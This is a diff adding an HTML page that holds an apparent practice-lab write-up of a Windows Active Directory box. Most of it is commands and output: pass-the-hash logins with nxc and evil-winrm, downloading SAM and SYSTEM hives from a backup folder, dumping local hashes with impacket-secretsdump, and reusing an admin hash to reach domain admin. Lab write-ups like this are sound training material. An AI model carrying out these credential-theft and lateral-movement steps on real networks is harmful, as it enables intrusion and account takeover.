@@ -1,0 +1,76 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX142</h1>
+    <p class="text">Since I got celia.almeda's NTLM hash, I checked its access rights with nxc.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/AD]
+└─$ nxc winrm 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd     
+WINRM       10.10.174.142   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.174.142   5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
+WINRM       10.10.174.142   5985   MS02             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd zip() argument 2 is longer than argument 1</code></pre></div>
+
+<p class="text">I could use extracted credential to access MS02. I logon to MS02 with evil-winrm.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/AD]
+└─$ evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> </code></pre></div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I found backup of this machine and could access to C:\windows.old\windows\system32, where stores SAM and SYSTEM hive.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\windows.old\windows\system32> dir | findstr SAM
+-a----          4/4/2022   6:00 AM          57344 SAM
+*Evil-WinRM* PS C:\windows.old\windows\system32> dir | findstr SYSTEM
+-a----          4/4/2022   6:00 AM       11636736 SYSTEM</code></pre></div>
+
+<p class="text">I installed the two files on my local machine.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\windows.old\windows\system32> download SAM
+                                        
+Info: Downloading C:\windows.old\windows\system32\SAM to SAM
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\windows.old\windows\system32> download SYSTEM
+                                        
+Info: Downloading C:\windows.old\windows\system32\SYSTEM to SYSTEM</code></pre></div>
+<p class="text">Then, I extracted credentials stored in SMA and SYSTEM files with Impacket-secretsdump.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/AD]
+└─$ impacket-secretsdump -system SYSTEM -sam SAM local             
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
+tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
+David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
+Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
+[*] Cleaning up... </code></pre></div>
+
+<p class="text">I got credential for tom_admin.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/AD]
+└─$ nxc smb 10.10.174.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc    
+SMB         10.10.174.140   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)                                                                                                      
+SMB         10.10.174.140   445    DC01             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)</code></pre></div>
+<p class="text">This user is a member of domain admin group.</p>
+
+</body>
+</html>
